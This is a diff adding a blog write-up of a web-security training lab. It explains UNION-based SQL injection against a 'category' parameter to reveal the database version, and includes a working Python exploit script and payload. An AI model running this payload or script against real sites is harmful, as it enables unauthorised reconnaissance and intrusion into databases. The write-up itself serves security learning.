@@ -1,0 +1,70 @@
+---
+title: 'SQLi Lab 4'
+description: 'Using UNION-based SQL injection to extract database type and version on MySQL and Microsoft SQL Server.'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## SQL Injection: Extracting Database Type and Version
+
+<div style="text-align: justify;">
+  This lab demonstrated how SQL injection vulnerabilities can be exploited to reveal system-level information about the backend database. Specifically, the injection targeted a parameter using a `UNION SELECT` with the `@@version` system variable, which allowed the attacker to retrieve the database version—useful for tailoring further attacks based on the environment (e.g., MySQL vs. Microsoft SQL Server).
+
+  The attack began by analyzing the application's request to the `/filter` endpoint, where the `category` parameter was found vulnerable to injection. By crafting a payload that appended a malicious SQL statement, the server responded with the version string embedded in the page content. This knowledge helps in identifying the DBMS and optimizing payloads for privilege escalation or data extraction.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+
+- The `category` parameter is vulnerable to SQL injection.
+- A crafted `UNION SELECT` query is used to inject `@@version` into the SQL query.
+- The version string (e.g., `MySQL 5.x` or `Microsoft SQL Server`) is returned in the response.
+- The script checks for known indicators like the word “ubuntu” to verify success.
+- Minor adjustments may be needed depending on the lab environment's output.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import requests
+import sys
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def exploit_sqli(url, payload):
+    uri = '/filter?category='
+    r = requests.get(url + uri + payload , verify=False, proxies=proxies)
+    if "ubuntu" in r.text:
+        return True
+    else:
+        return False
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+        payload = '\' UNION SELECT @@version, NULL-- -'
+    except IndexError:
+        print("[-] Usage: %s <url>" %sys.argv[0])
+        print('[-] Example: %s www.example.com ' % sys.argv[0])
+        sys.exit(-1)    
+        
+    if exploit_sqli(url, payload):
+        print("[+] SQL injection successful!")
+    else:
+        print("[-] SQL injection unsuccessful")        
+```
+
+import { Comment } from 'astro-pure/advanced'
+
+<Comment />
